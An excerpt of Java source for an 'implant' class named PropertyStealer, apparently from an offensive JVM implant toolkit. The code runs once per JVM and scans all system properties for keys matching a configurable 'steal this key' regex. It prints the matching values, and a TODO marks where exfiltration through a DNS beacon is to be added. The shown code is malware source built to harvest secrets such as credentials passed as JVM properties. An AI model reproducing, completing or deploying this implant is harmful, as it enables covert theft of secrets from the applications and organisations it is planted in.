 ...
 * it slightly.</p>
 */
public class PropertyStealer implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_STEAL_THIS_KEY_REGEX = ".*substring.*";
    /**
    ...
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                PropertyStealer implant = new PropertyStealer();
    ...
    /**
     * Property matcher returns whatever is worth stealing in a set of Properties.
     * @param props Properties to match
     * @return      Matching properties
     */
    public static Properties matchProperties(Properties props) {
        Pattern pattern = Pattern.compile(CONF_STEAL_THIS_KEY_REGEX);
        Properties matching = new Properties();

        for (String key : props.stringPropertyNames()) {
            Matcher matcher = pattern.matcher(key);
            if (matcher.matches()) {
                matching.setProperty(key, props.getProperty(key));
            }
        }
        return matching;
    }
    ...
    private void payload() {
        // Retrieve all loaded system properties
        Properties allLoadedProperties = System.getProperties();

        // Search for keys matching the regex
        for (String key : matchProperties(allLoadedProperties).stringPropertyNames()) {
            /* TODO: Add exfiltration using DnsBeacon here. */
            System.out.println("Found match: " + key + " = " + allLoadedProperties.getProperty(key));
        }
    }
}
